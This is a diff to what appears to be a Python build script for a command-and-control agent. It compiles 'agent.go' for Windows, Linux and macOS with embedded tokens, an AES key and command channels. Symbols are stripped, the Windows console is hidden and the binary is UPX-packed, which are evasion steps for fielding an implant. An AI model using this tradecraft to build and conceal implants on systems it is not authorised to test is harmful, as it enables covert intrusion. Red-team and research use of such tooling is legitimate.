@@ -125,5 +125,9 @@ conn.close()
 print("Database created successfully")
 
 # Build exe and pack with UPX
-subprocess.run(["bash", "-c", "GOOS=windows GOARCH=amd64 go build -ldflags \"-s -w -H windowsgui -X main.responses=%s -X main.registration=%s -X main.commands=%s -X main.bearer=%s -X main.token=%s -X main.key=%s\" agent.go" % (responses, registration, commands, bearer, token, AESkey)])
-subprocess.run(["bash", "-c", "upx --force agent.exe"])
+subprocess.run(["bash", "-c", "GOOS=windows GOARCH=amd64 go build -o agent.windows.exe -ldflags \"-s -w -H windowsgui -X main.responses=%s -X main.registration=%s -X main.commands=%s -X main.bearer=%s -X main.token=%s -X main.key=%s\" agent.go" % (responses, registration, commands, bearer, token, AESkey)])
+subprocess.run(["bash", "-c", "upx --force agent.windows.exe"])
+
+# Build for linux and macOS
+subprocess.run(["bash", "-c", "GOOS=linux GOARCH=amd64 go build -o agent.linux -ldflags \"-s -w -X main.responses=%s -X main.registration=%s -X main.commands=%s -X main.bearer=%s -X main.token=%s -X main.key=%s\" agent.go" % (responses, registration, commands, bearer, token, AESkey)])
+subprocess.run(["bash", "-c", "GOOS=darwin GOARCH=amd64 go build -o agent.darwin -ldflags \"-s -w -X main.responses=%s -X main.registration=%s -X main.commands=%s -X main.bearer=%s -X main.token=%s -X main.key=%s\" agent.go" % (responses, registration, commands, bearer, token, AESkey)])
